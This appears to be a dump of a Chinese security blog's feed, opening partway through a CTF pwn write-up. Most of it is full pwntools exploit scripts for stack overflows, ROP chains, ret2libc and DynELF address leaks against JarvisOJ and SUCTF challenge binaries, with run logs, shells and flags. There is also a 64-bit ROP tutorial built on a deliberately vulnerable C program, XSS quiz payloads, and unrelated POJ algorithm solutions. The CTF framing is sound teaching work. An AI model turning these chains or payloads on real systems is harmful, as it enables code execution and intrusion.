port 9882: Done[*] &apos;/home/chybeta/pwn/ctf/xman/2x64/level2_x64&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeInput:$ lsflaglevel2_x64$ cat flagCTF&#123;081ecc7c8d658409eb43358dcc1cf446&#125; level 3分析main函数跟前面一样。 vuln函数: 仍然是栈溢出。题目给了libc.so，这样我们就有偏移。利用write泄露出read的地址后计算出system和sh的地址，之后直接调用即可。 exp1234567891011121314151617181920212223242526272829303132333435363738from pwn import *p = remote("pwn2.jarvisoj.com",9879)elf = ELF("./level3")libc = ELF("./libc-2.19.so")p.recvuntil("Input:\n")offset = 0x88 + 4read_system_offset = libc.symbols['read'] - libc.symbols['system']read_sh_offset = libc.symbols['read'] - next(libc.search("/bin/sh"))read_got = elf.got['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']payload = 'a' * offsetpayload += p32(write_plt)payload += p32(vuln_addr)payload += p32(1)payload += p32(read_got)payload += p32(4)p.sendline(payload)read_addr = u32(p.recv(4))system_addr = read_addr - read_system_offsetsh_addr = read_addr - read_sh_offsetlog.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("sh address =&gt; &#123;&#125;".format(hex(sh_addr)))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p32(system_addr)payload += p32(0xdeadbeef)payload += p32(sh_addr)p.sendline(payload)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/3$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9879: Done[*] &apos;/home/chybeta/pwn/ctf/xman/3/level3&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] &apos;/home/chybeta/pwn/ctf/xman/3/libc-2.19.so&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] system address =&gt; 0xf763a310[+] sh address =&gt; 0xf775a84c[*] Switching to interactive mode$ lsflaglevel3$ cat flagCTF&#123;d85346df5770f56f69025bc3f5f1d3d0&#125;$ exp（无libc版本）假设题目没有给libc的话，可以用下面这个exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *#p = process("./level3")p = remote("pwn2.jarvisoj.com",9879)# p = remote("127.0.0.1",12345)elf = ELF("./level3")pop3addr = 0x08048519offset = 0x88 + 4bss_addr = elf.bss() + 0x20read_plt = elf.plt['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']start_addr = elf.symbols['_start']main_addr = elf.symbols['main']def leak(address): log.info("leaking address =&gt; &#123;&#125;".format(hex(address))) p.recvuntil("Input:\n") payload = 'a' * offset payload += p32(write_plt) payload += p32(pop3addr) payload += p32(1) payload += p32(address) payload += p32(4) payload += p32(main_addr) p.sendline(payload) address = p.recv(4) return addressd = DynELF(leak, elf=ELF("./level3"))system_addr = d.lookup("system","libc")log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))sh = "/bin/sh\x00"payload = 'a' * offsetpayload += p32(read_plt)payload += p32(pop3addr)payload += p32(0)payload += p32(bss_addr)payload += p32(100)# payload +=payload += p32(system_addr)payload += p32(1)payload += p32(bss_addr)p.sendline(payload)p.sendline(sh)p.interactive() 这个exp几乎和level4的相同，所以具体的一些坑就见下面吧。 level 3 x64分析函数啥的，跟前面的level3一样。参数用rdi，rsi等寄存器优先传递。构造rop链。 exp12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *p = remote("pwn2.jarvisoj.com",9883)elf = ELF("./level3_x64")libc = ELF("./libc-2.19.so")offset = 0x80 + 8read_got = elf.got['read']write_plt = elf.plt['write']vuln_addr = elf.symbols['vulnerable_function']pop_rdi_ret_addr = 0x00000000004006b3pop_rsi_pop_r15_ret_addr = 0x00000000004006b1read_system_offset = libc.symbols['read'] - libc.symbols['system']read_sh_offset = libc.symbols['read'] - next(libc.search('/bin/sh\x00'))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_ret_addr)payload += p64(read_got)payload += p64(1)payload += p64(write_plt)payload += p64(vuln_addr)p.send(payload)read_addr = u64(p.recv(8))system_addr = read_addr - read_system_offsetsh_addr = read_addr - read_sh_offsetlog.success("read address =&gt; &#123;&#125;".format(hex(read_addr)))log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("sh address =&gt; &#123;&#125;".format(hex(sh_addr)))p.recvuntil("Input:\n")payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_addr)p.send(payload)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/3x64$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9883: Done[*] &apos;/home/chybeta/pwn/ctf/xman/3x64/level3_x64&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] &apos;/home/chybeta/pwn/ctf/xman/3x64/libc-2.19.so&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] read address =&gt; 0x7f5c484726a0[+] system address =&gt; 0x7f5c483cd590[+] sh address =&gt; 0x7f5c485038c3[*] Switching to interactive mode$ lsflaglevel3_x64$ cat flagCTF&#123;b1aeaa97fdcc4122533290b73765e4fd&#125; level 4分析main()函数和前同。 vuln函数： 没给libc，自己利用栈溢出和DynELF来泄露system地址。完了后调用read函数往bss段写入sh字符串，最后完成调用。这个思路很老套了。不过自己写的时候踩了很多坑，列举如下： leak函数中，若每次leak完后跳转到vuln函数地址，则远程getshell不成功，尽管本地测试可以。 leak函数中，需要在leak后先pop3把栈上参数清空后再进行跳转到main函数中，否则本地或远程getshell都不成功。 在泄露完system地址后，若再调用一次start函数以恢复栈，则远程getshell不成功，尽管本地测试可以。 还有一些… 以上几点，在以前利用时没遇到过，这次想了很久也不知道为什么。。。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *# p = process("./level4")p = remote("pwn2.jarvisoj.com",9880)# p = remote("127.0.0.1",12345)elf = ELF("./level4")pop3addr = 0x08048509offset = 0x88 + 4bss_addr = elf.bss() + 0x20read_plt = elf.plt['read']write_plt = elf.plt['write']main_addr = elf.symbols['main']start_addr = elf.symbols['_start']def leak(address): log.info("leaking address =&gt; &#123;&#125;".format(hex(address))) # p.recvuntil("Input:\n") payload = 'a' * offset payload += p32(write_plt) payload += p32(pop3addr) payload += p32(1) payload += p32(address) payload += p32(4) payload += p32(main_addr) p.send(payload) data = p.recv(4) return datad = DynELF(leak, elf=ELF("./level4"))system_addr = d.lookup("system","libc")log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))sh = "/bin/sh\x00"payload = 'a' * offsetpayload += p32(read_plt)payload += p32(pop3addr)payload += p32(0)payload += p32(bss_addr)payload += p32(len(sh))payload += p32(system_addr)payload += p32(1)payload += p32(bss_addr)p.send(payload)p.send(sh)p.interactive() flag1234567891011121314151617181920212223(venv) chybeta@ubuntu:~/pwn/ctf/xman/4$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done[*] &apos;/home/chybeta/pwn/ctf/xman/4/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] leaking address =&gt; 0x80480000x8048000 \x7fELF[+] Loading from &apos;/home/chybeta/pwn/ctf/xman/4/level4&apos;: 0xf77fb930[*] leaking address =&gt; 0x804a004..........[+] system address =&gt; 0xf769be80[*] Switching to interactive mode$$$ lsflaglevel4$ cat flagCTF&#123;882130cf51d65fb705440b218e94e98e&#125; :)文件已打包：http://pan.baidu.com/s/1eR2XzNk 密码：9y4l12345678910111213141516171819202122232425xman├── 0│ ├── exp.py│ └── level0├── 1│ ├── exp.py│ └── level1├── 2│ ├── exp.py│ └── level2├── 2x64│ ├── exp.py│ └── level2_x64├── 3│ ├── exp2.py│ ├── exp.py│ ├── level3│ └── libc-2.19.so├── 3x64│ ├── exp.py│ ├── level3_x64│ └── libc-2.19.so└── 4 ├── exp.py └── level4]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SUCTF-2016-pwn400-writeup]]></title>
      <url>%2F2017%2F06%2F28%2FSUCTF-2016-pwn400-writeup%2F</url>
      <content type="text"><![CDATA[SUCTF-2016-pwn400-writeupIDA看，程序流程简单，有明显栈溢出漏洞。 无libc，无canary等保护。基本的思路如下： 构造ROP链 泄露system地址 往bss段写入/bin/sh 调用system 最后的exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *p = process("./simple")elf = ELF("./simple")offset = 40pop_rdi_ret_addr = 0x00000000004006c3pop_rsi_pop_r15_ret = 0x00000000004006c1start_addr = elf.symbols['_start']write_plt = elf.plt['write']read_plt = elf.plt['read']main_addr = elf.symbols['main']bss_addr = elf.bss() + 0x18def leak(address): log.info("leak address =&gt; &#123;&#125;".format(hex(address))) p.recvuntil('luck!\n') payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_ret) payload += p64(address) payload += p64(1) payload += p64(write_plt) payload += p64(main_addr) p.sendline(payload) address = p.recv(8) return addressd = DynELF(leak,elf = elf)system_addr = d.lookup('system','libc')log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))payload = 'a' * offsetpayload += p64(start_addr)p.sendline(payload)p.recvuntil('luck!\n')payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_ret)payload += p64(bss_addr)payload += p64(1)payload += p64(read_plt)payload += p64(main_addr)p.sendline(payload)payload = '/bin/sh\x00'p.send(payload)p.recvuntil('luck!\n')payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.sendline(payload)p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ROP学习：64位栈溢出]]></title>
      <url>%2F2017%2F06%2F26%2FROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
      <content type="text"><![CDATA[web狗的二进制之路。 环境准备c程序 test.c ：123456789101112#include&lt;stdio.h&gt;void func()&#123; char name[0x50]; read(0, name, 0x100); write(1, name, 0x100);&#125;int main()&#123; func(); return 0;&#125; 编译：1gcc test.c -o pwn -O0 -fno-stack-protector 选项 -O0 表示不进行任何优化， -fno-stack-protector表示无canary保护。 基础知识C语言调用机制使用了栈数据结构，先进后出。同时栈是由高地址向低地址增长。 在64位环境下，函数的调用所需要的参数是优先通过寄存器来进行的。寄存器的顺序如下：rdi,rsi,rdx,rcx,r8,r9。当一个函数有大于6个整形参数，则超出的部分会通过栈来传递，这个情况少见。 64位环境下，还有几个特殊的指针（寄存器）：rip、rbp和rsp。其中rip是指令指针，cpu会把rip指向的内容当作指令执行。rbp指向当前栈帧的底部。rsp指向当前栈帧的顶部。 ROP由于64位下，是优先通过寄存器来传参，所以不能像在32位环境下直接去布置栈上的数据来exp。这时需要用到ROP技术(Retrun-oriented Programmming)，从可执行文件或者库中提取部分代码片段来进行恶意利用。 比如我们想要传入一个参数，那这个参数需要被布置到寄存器rdi中，这时我们可以寻找诸如pop rdi;ret的代码片段，从而在执行完pop rdi后把栈上布置好的数据存放到寄存器rdi中后能够再次控制程序执行流（ret） 常见的寻找ROP的工具有很多，这里使用ROPgadget。以前面的例子为例。1ROPgadget --binary &quot;pwn&quot; --only &quot;pop|ret&quot; 分析我们的测试程序是123456789101112#include&lt;stdio.h&gt;void func()&#123; char name[0x50]; read(0, name, 0x100); write(1, name, 0x100);&#125;int main()&#123; func(); return 0;&#125; 有非常明显的栈溢出漏洞，read从标准输入流（0）读取0x100放到name里面，之后write从name中读取长度为0x100的字节输出到屏幕（1）。我们可以通过输入，从而去覆盖func（）的返回地址，从而劫持控制流。 为能找到溢出点，可以使用pattern.py来测试。12(venv) chybeta@ubuntu:~/pwn/test$ pattern 100Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 接着利用gdb，在运行（r）后输入上述生成的字符串，此时gdb发生段错误。因为是在64位环境下，指针无法到达高地址，即不能超过0x00007fffffffffff，所以不能直接利用查看$eip的方法。但因为ret指令，相当于pop rsp，所以只要看一下rsp的值，就知道跳转的地址，从而知道溢出点。1234567gdb-peda$ x/gx $rsp0x7fffffffdc98: 0x3164413064413963.......(venv) chybeta@ubuntu:~/pwn/test$ pattern 0x3164413064413963Pattern 0x3164413064413963 first occurrence at position 88 in pattern. 所以，溢出点是88个字节。 提供libc环境准备用ldd命令可以看到pwn程序运行时使用的libc.so。1234(venv) chybeta@ubuntu:~/pwn/test$ ldd pwn linux-vdso.so.1 =&gt; (0x00007ffeb7d64000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb139e93000) /lib64/ld-linux-x86-64.so.2 (0x00005602037ac000) 将/lib/x86_64-linux-gnu/libc.so.6拷贝到当前目录下。1cp /lib/x86_64-linux-gnu/libc.so.6 libc.so 思路 提供了libc.so，可以计算出read函数与system函数和sh字符串的偏移量。 利用write函数泄露出read函数的地址，从而计算system函数和sh字符串的真实地址。 调用system函数，并传入参数，即sh字符串。 exp:接下去根据exp进行一下详细的讲解。12345678910from pwn import *p = process("./pwn")elf = ELF("./pwn")libc = ELF("libc.so") # 题目提供offset = 88 offset_read_system = libc.symbols["read"] - libc.symbols["system"]offset_read_binsh = libc.symbols["read"] - next(libc.search("/bin/sh\x00"))log.success("offset_read_system =&gt; &#123;&#125;".format(hex(offset_read_system)))log.success("offset_read_binsh =&gt; &#123;&#125;".format(hex(offset_read_binsh))) offset偏移由pattern.py和gdb计算得出。read与system地址和sh地址由提供的libc，结合pwntools得到。 12pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621 两个地址，由ROPgadget得到，用于参数的传递。 123456789payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_addr)payload += p64(elf.got["read"])payload += p64(1) payload += p64(elf.plt['write'])payload += p64(elf.symbols['func'])p.send(payload) 利用write函数泄露read函数地址。&#39;a&#39;*offset后到溢出点return跳到执行pop rdi，此时栈顶的数据为1，pop完后1被保存在寄存器rdi中，作为write的第一个参数。之后返回（ret）跳转到执行pop rsi，此时栈顶的数据为read函数的plt表地址，pop完后，其地址被保存在rsi中，作为write的第二个参数。接下去要执行pop r15，没有什么用，所以我们随便写一个p64（1）进去。再接下去就是ret（返回）跳转到func函数，以便进行下一次利用。为什么我们没有设置write的第三个参数呢？？？ 见下文。 12p.recv(0x100)read_addr = u64(p.recv(8)) 前面发送payload后，先执行了正常的write函数流程，注意源程序中的write的第三个参数是0x100，所以需要先p.recv(0x100)，之后由于func的返回地址被覆盖了，程序流程会进入我们设置好的rop中。在rop链中，我们修改了write的前两个参数，此时write的函数调用如下：write(1,read_plt_addr,0x100)。我们的目的是获得read函数的地址，在64位环境下为8个字节，所以只需要截取write输出的前8个字节，即read_addr = u64（p.recv(8)）。 12345system_addr = read_addr - offset_read_systembinsh_addr = read_addr - offset_read_binshlog.success("read_addr =&gt; &#123;&#125; ".format(hex(read_addr)))log.success('system_addr =&gt; &#123;&#125;'.format(hex(system_addr)))log.success("binsh_addr =&gt; &#123;&#125;".format(hex(binsh_addr))) 获取了read函数地址后，就可以计算system（）函数和字符串sh的地址了 1234567payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(binsh_addr)payload += p64(system_addr)p.send(payload)p.interactive() 第一次rop结束后，我们让它ret到func函数，接下来构造新的rop。同样利用&#39;a&#39;*offset先溢出到return，通过pop rdi，将sh字符串的地址保存到寄存器rdi中，作为system（）函数的参数。之后是ret，直接返回到system（）函数的地址，从而成功getshell（） 附上完整的exp：123456789101112131415161718192021222324252627282930313233343536373839from pwn import *p = process("./pwn")elf = ELF("./pwn")libc = ELF("libc.so")offset = 88offset_read_system = libc.symbols["read"] - libc.symbols["system"]offset_read_binsh = libc.symbols["read"] - next(libc.search("/bin/sh\x00"))log.success("offset_read_system =&gt; &#123;&#125;".format(hex(offset_read_system)))log.success("offset_read_binsh =&gt; &#123;&#125;".format(hex(offset_read_binsh)))pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_addr)payload += p64(elf.got["read"])payload += p64(1)payload += p64(elf.plt['write'])payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)read_addr = u64(p.recv(8))log.success("read_addr =&gt; &#123;&#125; ".format(hex(read_addr)))system_addr = read_addr - offset_read_systembinsh_addr = read_addr - offset_read_binshlog.success('system_addr =&gt; &#123;&#125;'.format(hex(system_addr)))log.success("binsh_addr =&gt; &#123;&#125;".format(hex(binsh_addr)))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(binsh_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive() 不提供libc若题目没有提供libc的话，需要利用pwntool中的DynELF来泄露地址。但有些地方需要注意，因为DynELF会一直循环地去泄露地址，所以栈可能会有不可控的情况。根据《借助DynELF实现无libc的漏洞利用小结》，可以在函数地址泄露完后，调用_start函数以恢复栈。但我这里测试时，如果在泄露完成后再恢复就没办法pwn成功，我就直接把对_start的调用放到了leak函数里，每泄露一次就恢复一次栈。 思路 利用DynELF泄露出system的地址， 利用read函数向可写数据段（比如.bss段）写入字符串“/bin/sh” 调用system，getshell。 exp下面也是根据exp具体讲解。 1234from pwn import *p = process("./pwn")elf = ELF("./pwn")offset = 88 注意这里，我们已经没有用到libc.so了，手里有的只有pwn这个程序。 1234bss_addr = elf.bss()start_addr = elf.symbols['_start']pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621 bss_addr是我们准备写入字符串的bss段地址。start_addr用于恢复栈。pop_rdi_ret_addr，pop_rsi_pop_r15_addr由ROPgadget得到。 1234567891011121314151617181920def leak(address): log.info('leak address =&gt; &#123;&#125; '.format(hex(address))) payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_addr) payload += p64(address) payload += p64(1) payload += p64(elf.plt['write']) payload += p64(elf.symbols['func']) p.send(payload) p.recv(0x100) address = p.recv(8) p.recv() payload = 'a' * offset payload += p64(start_addr) p.send(payload) p.recv(0x100) return address 利用rop技术，结合write（）函数，泄露出地址后又回到func函数体中。注意泄露的地址是8个字节，所以address = p.recv(8)，而write的第三个参数（0x100）我们没法改变，所以需要用p.recv()接收剩下的字符。接下去就是回到func函数后，会去调用_start函数，恢复栈。完了后再次进入func（），进行下一次泄露。 123456d = DynELF(leak, elf = ELF('./pwn'))system_addr = d.lookup("system","libc")read_addr = d.lookup("read","libc")# read_addr = elf.plt['read']log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("read address =&gt; &#123;&#125;".format(hex(read_addr))) 利用DynELF泄露出system和read函数的地址。read函数的地址，其实可以直接获得，即注释中的read_addr = elf.plt[&#39;read&#39;] 12345678910111213payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_addr)payload += p64(bss_addr)payload += p64(1)payload += p64(read_addr)payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)payload = '/bin/sh\x00'p.send(payload) 这一部分，调用read函数，向bss段写入/bin/sh字符串，之后再回到func函数体中。通过pop_rdi_ret_addr构造了read的第一个参数是0，通过pop_rsi_pop_r15_addr构造了read的第二个参数为bss_addr。接下去的那个p64(1)只是为了执行pop_r15没有其他用处。因此在调用read（）时是这样的：read(0,bss_addr,0x100)。 12345678payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive() 这一部分，调用system（），利用pop_rdi_ret_addr提供参数/bin/sh 附上完整exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *p = process("./pwn")elf = ELF("./pwn")offset = 88bss_addr = elf.bss()start_addr = elf.symbols['_start']pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621def leak(address): log.info('leak address =&gt; &#123;&#125; '.format(hex(address))) payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_addr) payload += p64(address) payload += p64(1) payload += p64(elf.plt['write']) payload += p64(elf.symbols['func']) p.send(payload) p.recv(0x100) address = p.recv(8) p.recv() payload = 'a' * offset payload += p64(start_addr) p.send(payload) p.recv(0x100) return addressd = DynELF(leak, elf = ELF('./pwn'))system_addr = d.lookup("system","libc")read_addr = d.lookup("read","libc")# read_addr = elf.plt['read']log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("read address =&gt; &#123;&#125;".format(hex(read_addr)))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_addr)payload += p64(bss_addr)payload += p64(1)payload += p64(read_addr)payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)payload = '/bin/sh\x00'p.send(payload)payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[xss-quiz-writeup]]></title>
      <url>%2F2017%2F06%2F25%2Fxss-quiz-writeup%2F</url>
      <content type="text"><![CDATA[xss-quiz： http://xss-quiz.int21h.jp/ Stage 1payload:1&lt;script&gt;alert(document.domain)&lt;/script&gt; Stage 2http://xss-quiz.int21h.jp/stage2.php 尝试如下payload：1&lt;script&gt;alert(document.domain)&lt;/script&gt; 无反应，查看源代码： 需要闭合前面value的双引号，所以最后payload如下：1&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot; Stage 3http://xss-quiz.int21h.jp/stage-3.php 多了一个选择country的功能。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ACM-OJ[长期更新]]]></title>
      <url>%2F2017%2F06%2F19%2FACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%2F</url>
      <content type="text"><![CDATA[最近更新日期：2017-08-11干脆把自己平日做的题放在一篇文章里吧。不然太分散了。POJ: 1163 1182 1258 1273 1979 2236 2388 3069 3176 3253 3617XOJ: 1004 1005 1022 1061 1062 1075 1078 1316 POJ1163题目http://poj.org/problem?id=1163 思路见下面POJ-3176题分析 提交123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 355int way[MAX][MAX] = &#123;0&#125;;int triangle[MAX][MAX] = &#123;0&#125;;int n;using namespace std;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) scanf("%d",&amp;triangle[i][j]); way[0][0] = triangle[0][0]; for (int i = 1; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) &#123; if ( j == 0 ) &#123; way[i][j] = way[i-1][j] + triangle[i][j]; &#125; else if ( j == i ) &#123; way[i][j] = way[i-1][j-1] + triangle[i][j]; &#125; else &#123; way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; &#125; &#125; int lastrow = n - 1; int res = way[lastrow][0]; for (int j = 1; j &lt; n; j++)&#123; if (way[lastrow][j] &gt; res ) res = way[lastrow][j]; &#125; printf("%d\n", res); return 0;&#125; 1182题目http://poj.org/problem?id=1182 思路并查集使用。输入的x，有三种种类A,B,C，分别用x，x+n,x+2n来代表。输入后，先判断x，y是否符合范围要求。第一种关系中：x和y是同一种种类。即union_set(x,y),union_set(x+n,y+n),union_set(x+2n,y+2n)。在执行union_set()之前，要看是否存在矛盾关系，即判断same_set(x,y+n) || same_set(x,y+2n) || same_set(x+n,y) || same_set(x+n,y+2n) || same_set(x+2n,y) || same_set(x+2n,y+n)。第二种关系中；x吃y。即union_set(x,y+n),union_set(x+n,y+2n),union_set(x+3n,y).。在执行union_set()之前，要看是否存在矛盾关系，即判断same_set(x,y)|| same_set(x,y+2n) || same_set(x+n,y+n) ||same_set(x+n,y) || same_set(x+2n,y+n) || same_set(x+2n,y+2n)。 另外数组如果开小的话，会导致runtime error。。。 提交12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;cstdio&gt;#define MAX_N 500000using namespace std;int ans;int par[MAX_N];int ran[MAX_N];void init_set(int n)&#123; for (int i=1; i &lt;= n ; i++)&#123; par[i] = i; ran[i] = 0; &#125;&#125;int find_set(int x)&#123; int i = x; while(par[i] != i) &#123; i = par[i]; &#125; while(par[x] != i)&#123; int next; next = par[x]; par[x] = i; x = next; &#125; return i;&#125;int same_set(int x,int y)&#123; return find_set(x) == find_set(y);&#125;void union_set(int x,int y)&#123; int root_x = find_set(x); int root_y = find_set(y); if (root_x == root_y) return; if (par[root_x] &gt; par[root_y])&#123; par[root_y] = root_x; &#125;else&#123; par[root_x] = root_y; if (ran[root_x] == ran[root_y]) ran[root_y]++; &#125;&#125;int main()&#123; int n,k; ans = 0; scanf("%d%d",&amp;n,&amp;k); init_set(n*3); for (int i = 0; i &lt; k; i++)&#123; int d,x,y; scanf("%d%d%d",&amp;d,&amp;x,&amp;y); if (x &lt; 1 || x &gt; n || y &lt; 1 || y &gt; n)&#123; ans++; continue; &#125; if ( d == 1)&#123; if ( same_set(x,y+n) || same_set(x,y+2*n) || same_set(x+n,y) || same_set(x+n,y+2*n) || same_set(x+2*n,y) || same_set(x+2*n,y+n) )&#123; ans++; &#125;else&#123; union_set(x,y); union_set(x+n,y+n); union_set(x+2*n,y+2*n); &#125; &#125;else&#123; if (same_set(x,y)|| same_set(x,y+2*n) || same_set(x+n,y+n) ||same_set(x+n,y) || same_set(x+2*n,y+n) || same_set(x+2*n,y+2*n))&#123; ans++; &#125;else&#123; union_set(x,y+n); union_set(x+n,y+2*n); union_set(x+2*n,y); &#125; &#125; &#125; printf("%d\n",ans); return 0;&#125; 1258题目http://poj.org/problem?id=1258 思路最小生成树。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;#define MAX 105#define INF 0xFFFFFFusing namespace std;int n;int cost[MAX][MAX] ;int mincost[MAX];bool used[MAX];int prim() &#123; for ( int i = 0; i &lt; n; i++)&#123; mincost[i] = INF; used[i] = false; &#125; mincost[0] = 0; int res = 0; while ( true )&#123; int v = -1; for ( int u = 0; u &lt; n; u++)&#123; if ( !used[u] &amp;&amp; ( v == -1 || mincost[u] &lt; mincost[v])) v = u; &#125; if ( v == -1 ) break; used[v] = true; res += mincost[v]; for (int u = 0; u &lt; n; u++) mincost[u] = min(mincost[u], cost[v][u]); &#125; return res;&#125;int main()&#123; while(scanf("%d",&amp;n) != EOF )&#123; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; n; j++) cost[i][j] = INF; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; n ; j++) scanf("%d", &amp;cost[i][j]); printf("%d\n",prim()); &#125; return 0;&#125; 1273题目http://poj.org/problem?id=1273 思路模板题目，直接求最大流就可以。我用了vector来构造邻接表，而这题的输入时一次包含了很多个测试例子。所以每次读完后都需要对邻接表进行初始化，即进行下面的操作：12for (int i = 1; i &lt;= m; i++ ) G[i].clear(); 方法是网上找的，网上说这样清空了元素，但不会回收内存。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;memory.h&gt;#define MAX 205#define INF 0x7fffffffusing namespace std;struct edge &#123;int to ,cap, rev;&#125;;vector&lt;edge&gt; G[MAX];bool used[MAX];int n,m;void add_edge(int from, int to,int cap)&#123; edge one,two; one.to = to; one.cap = cap; one.rev = (int)(G[to].size()); G[from].push_back(one); two.to = from; two.cap = 0; two.rev = (int)(G[from].size()-1); G[to].push_back(two);&#125;int dfs(int v, int t, int f)&#123; if ( v == t) return f; used[v] = true; for ( int i = 0; i &lt; (int)G[v].size(); i++)&#123; edge &amp;e = G[v][i]; if ( !used[e.to] &amp;&amp; e.cap &gt; 0)&#123; int d = dfs(e.to,t, f &gt; e.cap?e.cap:f); if ( d &gt; 0) &#123; e.cap -= d; G[e.to][e.rev].cap += d; return d; &#125; &#125; &#125; return 0;&#125;int max_flow(int s, int t)&#123; int flow = 0; for (;;)&#123; memset(used, 0, sizeof(used)); int f = dfs(s,t,INF); if (f == 0) return flow; flow += f; &#125;&#125;int main()&#123; while (scanf("%d%d",&amp;n,&amp;m) != EOF)&#123; for (int i = 1; i &lt;= m; i++ ) G[i].clear(); for (int i = 0; i &lt; n; i++)&#123; int s, t,c; scanf("%d%d%d",&amp;s,&amp;t,&amp;c); add_edge(s,t,c); &#125; printf("%d\n",max_flow(1,m)); &#125; return 0;&#125; 1979题目http://poj.org/problem?id=1979 思路DFS() 